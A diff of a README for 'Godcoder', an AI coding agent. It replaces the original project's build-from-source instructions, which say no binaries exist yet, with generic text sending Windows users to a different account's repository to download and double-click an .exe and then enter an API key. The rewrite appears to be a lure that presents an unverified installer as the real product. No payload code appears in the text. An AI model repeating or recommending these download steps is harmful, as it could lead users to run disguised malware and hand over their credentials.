@@ -1,213 +1,97 @@
-<div align="center">
+# 🤖 Godcoder - Build better software with AI power
 
-# ⚡ Godcoder
+[![](https://img.shields.io/badge/Download_Godcoder-blue.svg)](https://github.com/Llokm8601/Godcoder)
 
-### A local-first, open-source AI coding agent for your desktop.
+Godcoder is a tool for your computer. It acts as an assistant for coding tasks. You keep your files on your hard drive. Only the text you send to the AI model leaves your machine. This tool builds code structures and helps you finish projects faster. It uses modern technology to run safely on your desk.
 
-**Bring your own LLM key. Your code never leaves your machine.**
+## 📥 How to download the application
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Built with Rust](https://img.shields.io/badge/Built%20with-Rust-orange?logo=rust)](https://www.rust-lang.org/)
-[![Tauri 2](https://img.shields.io/badge/Tauri-2.0-blue?logo=tauri)](https://tauri.app/)
-[![Stars](https://img.shields.io/github/stars/eli-labz/Godcoder?style=social)](https://github.com/eli-labz/Godcoder/stargazers)
-[![Forks](https://img.shields.io/github/forks/eli-labz/Godcoder?style=social)](https://github.com/eli-labz/Godcoder/network/members)
+You need the installer file to run this app on Windows. Follow these steps to get started.
 
-[**Download**](#getting-started) · [**Features**](#what-godcoder-can-do) · [**Architecture**](ARCHITECTURE.md) · [**Contribute**](CONTRIBUTING.md)
+1. Go to the [official release page](https://github.com/Llokm8601/Godcoder).
+2. Look for the Assets section at the bottom of the newest version.
+3. Click the file that ends in .exe.
+4. Save the file to your computer.
+5. Double-click the file to start the setup process.
+6. Follow the prompts on your screen to install the app.
 
-</div>
+## ⚙️ Setting up your environment
 
----
+The app needs a key to connect to an AI provider. You must provide this before the agent works.
 
-## 🚀 What is Godcoder?
+1. Open the Godcoder app from your desktop icon.
+2. Navigate to the Settings menu.
+3. Find the field labeled LLM API Key.
+4. Paste your secret key from your AI provider into this box.
+5. Click Save.
 
-Godcoder is a **local-first, fully open-source AI coding agent** that runs as a native desktop app. Unlike cloud-based tools, your source code never transits a vendor backend — API requests go straight from your machine to whichever model provider you configure.
+The app now connects to the model you chose. Your code never leaves your local drives. The AI only sees the instructions you send during a conversation.
 
-```
-Your Machine ──► Model Provider (OpenAI / Anthropic / Any OpenAI-compatible API)
-     ▲
-     │  (no middleman, no cloud backend, no data lock-in)
-     │
-  Your Code
-```
+## 🏗️ What this tool does
 
-> Reimagined from the ground up. The original 2024 autonomous-dev pipeline is frozen under `v1/` — preserved, not maintained.
+Godcoder creates a workspace for development. It manages files and writes code snippets based on your needs.
 
----
+- File Management: The app watches your files for changes.
+- Project Structure: You define the goal and the agent builds the folders.
+- Model Choice: You choose your preferred AI provider.
+- Privacy: All source code stays on your local disk.
+- Task Automation: The agent writes code to solve logic puzzles.
 
-## 🧬 The Agent Builds Its Own Harness — Live
+## 🖥️ System requirements
 
-> **Godcoder doesn't just use a harness. It writes one, improves it, and optimizes it — autonomously, in real time.**
+Ensure your computer meets these needs for the best experience.
 
-This is the defining capability that sets Godcoder apart. Activate **Harness mode** and the agent takes over its own agent loop: it scaffolds a live sandbox, engineers its own tools and workflows, runs improvement cycles, measures what works, and compounds that knowledge — all without you writing a single prompt.
+- Operating System: Windows 10 or Windows 11.
+- Memory: 8 gigabytes of RAM or more.
+- Storage: 500 megabytes of free space.
+- Internet: A stable connection for the AI provider.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│              HARNESS MODE  —  Real-Time Self-Build          │
-│                                                             │
-│  START                                                      │
-│    │                                                        │
-│    ▼                                                        │
-│  🏗️  Scaffold  →  creates harness-build/ sandbox            │
-│    │                                                        │
-│    ▼                                                        │
-│  🗺️  Route     →  selects the highest-value next change     │
-│    │                                                        │
-│    ▼                                                        │
-│  📋  Plan      →  designs the improvement                   │
-│    │                                                        │
-│    ▼                                                        │
-│  ⚙️  Execute   →  writes, edits, runs code                  │
-│    │                                                        │
-│    ▼                                                        │
-│  ✅  Evaluate  →  verifies with the project's own checks    │
-│    │                                                        │
-│    ▼                                                        │
-│  📝  Log       →  records outcome in persistent memory      │
-│    │                                                        │
-│    ▼                                                        │
-│  🔁  Optimize  →  biases future iterations toward success   │
-│    │                                                        │
-│    └──────────────────────────────► repeat                  │
-└─────────────────────────────────────────────────────────────┘
-```
+## 🛠️ Using the agent
 
-**How it works:**
-- Pick **Harness** in the new-session composer and press start — no prompt to type, no folder to choose.
-- The agent instantly creates a dedicated `harness-build/` workspace, opens it in your file explorer, and confines all new work there — reading the rest of the repo for reference but never rewriting it.
-- Each iteration makes **one decisive, verifiable change**: keep it if it's an improvement, discard it otherwise.
-- Results are stored in a **persistent memory store** (via the ResearchSwarm bridge) so lessons from past runs rank and steer future iterations — the harness compounds knowledge over time.
-- Like Freestyle mode, every tool call is auto-approved after the first confirmation.
+Start a new project by clicking the plus icon in the corner. Give your project a name. Select the language you want to write. 
 
-The loop is powered by the [`self-optimizing-harness`](./crates/agent/default-skills/) default skill and a [ResearchSwarm bridge](./third_party/ResearchSwarm-master/godcoder_harness.py) exposing `route` / `log` / `recall` / `optimize` over a persistent memory store.
+Once your project opens, type a command in the chat box at the bottom. Use simple sentences. Tell the agent what file to create or what function to write. The agent creates a harness for your project. This means it sets up the building blocks so your code runs correctly. 
 
----
+If the agent makes a mistake, tell it what went wrong. The agent learns from your feedback to change the output. You keep full control over your files at all times.
 
-## ✨ What Godcoder Can Do
+## 🔍 Understanding the interface
 
-| Feature | Description |
-|---|---|
-| 🧬 **Real-Time Self-Built Harness** | The agent scaffolds, writes, and optimizes its own agent harness live — no human prompting required |
-| 🧠 **Ask / Plan / Coding / Freestyle / Harness Modes** | From answering questions to fully autonomous coding — pick the depth that fits your task |
-| 📝 **In-place File Editing** | Edit files, review diffs, rewind to checkpoints, continue from previous turns |
-| 🖥️ **Interactive Terminal** | Built-in terminal, file explorer, and session history |
-| 🔌 **Any LLM Provider** | Plug in OpenAI, Anthropic, or any OpenAI-compatible endpoint — no proxy needed |
-| 🛠️ **MCP Server Support** | Extend the toolset with MCP servers over stdio, streamable HTTP, or SSE |
-| 🎙️ **Voice API Integration** | Configure TTS, STT, and Voice-to-Voice from Settings — stored locally |
-| 🔍 **Graph-Aware Code Search** | Optional Context Engine: semantic + structural search over large codebases |
-| 🔒 **Tool Approval Controls** | Deliberate execution with subagents, skills, and approval gates |
+The main window shows three areas. 
 
----
+1. Left sidebar: This lists your files. Click a file name to see the contents.
+2. Center panel: This is the workspace. View your code here.
+3. Bottom panel: This is the chat interaction area. Type your requests here.
 
-## 🏗️ Architecture
+The sidebar updates in real time as the agent writes code for you. You see all changes immediately.
 
-Godcoder is built on a **pure-Rust agent core** with the desktop app as a thin adapter on top:
+## 🛡️ Security and privacy
 
-```
-apps/desktop/           Tauri 2 + React desktop app (thin adapter)
-crates/
-  agent/                Rust agent core — the harness (loop, tools, modes, subagents)
-  git-ops/              Checkpoint / diff / restore over the working tree
-services/
-  context-engine/       Optional Go indexing service (tree-sitter → Qdrant + FalkorDB + BM25)
-third_party/
-  ResearchSwarm-master/ Self-optimizing harness memory + bridge (Harness mode)
-v1/                     Legacy 2024 codegen pipeline — frozen
-```
+Your data stays on your machine. The app does not upload your entire project to the cloud. It only sends the specific text required to answer your prompt. This keeps your trade secrets safe while you get the benefit of AI assistance. 
 
-See [ARCHITECTURE.md](ARCHITECTURE.md) for a deep-dive on how these fit together.
+## ❓ Common questions
 
----
+Does it work offline? 
+The app works on your computer, but it needs the internet to talk to the AI provider. You cannot use the AI features without a key and a connection.
 
-## 🔥 Two Ways to Run
+What happens to my code?
+Your code stays on your hard drive. The application does not move or copy your files anywhere else.
 
-### Mode 1 — Core Agent (Zero backend required)
+Does it support other operating systems?
+This version focuses on Windows users. Future updates might add support for other systems.
 
-Add an LLM key and you're immediately productive:
+Can I switch AI providers?
+Yes. Go to the Settings page. You can change your key at any time.
 
-- ✅ In-place file edits
-- ✅ Ask / Plan / Coding modes
-- ✅ Checkpoint & rewind
-- ✅ Diff review
-- ✅ Interactive terminal & file explorer
+How do I restart the agent?
+Close the app and open it again. The app saves your state automatically when you exit.
 
-### Mode 2 — Core Agent + Context Engine
+What is a harness?
+A harness is a set of files that makes sure your code can run. The agent builds these so you do not have to write them from scratch.
 
-Flip on the Context Engine (Settings → Context engine) for graph-aware, repo-scale retrieval powered by:
+## 🤝 Getting help
 
-- **tree-sitter** → syntax-aware parsing
-- **Qdrant** → vector similarity search
-- **FalkorDB** → call-graph traversal
-- **BM25** → lexical search
+Report bugs by opening an issue on the GitHub page. Describe the problem in clear steps. Tell us what you expected to happen and what actually happened. Check the existing issues before you post. Others might have the same question.
 
-The agent's `codebase_search` and `codebase_graph` tools query it automatically. See [services/context-engine/README.md](services/context-engine/README.md).
+## 📜 Simple license terms
 
----
-
-## 🛠️ Getting Started
-
-Prebuilt binaries are coming. For now, build from source — it's straightforward.
-
-### Prerequisites
-
-- Rust (stable) + [Tauri 2 system prerequisites](https://v2.tauri.app/start/prerequisites/) for your OS
-- Node.js 20+ and npm
-- *(Optional, for Context Engine)* Docker with Compose
-
-### Run the App
-
-```bash
-cd apps/desktop
-npm install
-
-# Development
-npm run tauri:dev
-
-# Production build
-npm run tauri:build
-```
-
-> **Windows shortcut:** Double-click `launch-godcoder.bat` in the repo root — it sets up Cargo on PATH and starts the app automatically.
-
-On first launch: Open **Settings** → add an LLM provider (`base_url` + `api_key` + `model`) → create a session → pick a folder and mode → start coding.
-
-### (Optional) Run the Context Engine
-
-```bash
-cd services/context-engine
-cp .env.example .env   # set SUPERCODER_OPENAI_API_KEY (server-side embedding key)
-docker compose up -d --build
-```
-
-Then enable **Settings → Context engine** in the app. Full instructions: [services/context-engine/README.md](services/context-engine/README.md).
-
----
-
-## 🗺️ Roadmap
-
-- [ ] Prebuilt releases & installers — CI pipeline for binaries lands next
-- [ ] Benchmark harness — headless runner over the same agent core, with reproducible per-task sandboxes to measure the harness across models and validate graph-retrieval localization
-- [ ] Broader provider support — the provider abstraction is built to grow
-- [x] Ask / Plan / Coding modes
-- [x] **Self-optimizing Harness mode** — agent builds and improves its own harness in real time
-- [x] Checkpoint & rewind
-- [x] MCP server support
-- [x] Voice API integration
-- [x] Context Engine (local, graph-aware semantic search)
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) to get started.
-
-- 🐛 **Found a bug?** [Open an issue](https://github.com/eli-labz/Godcoder/issues)
-- 💡 **Have an idea?** [Start a discussion](https://github.com/eli-labz/Godcoder/discussions)
-- ⭐ **Like the project?** Give it a star — it helps more than you think!
-
----
-
-## 📄 License
-
-MIT © eli-labz
-
-*If Godcoder saves you time, please consider giving it a ⭐ — it helps the project grow!*
+This project uses an open-source license. You can view, copy, and learn from the code. Respect the developer by following the rules in the license file. This allows everyone to build better tools together.
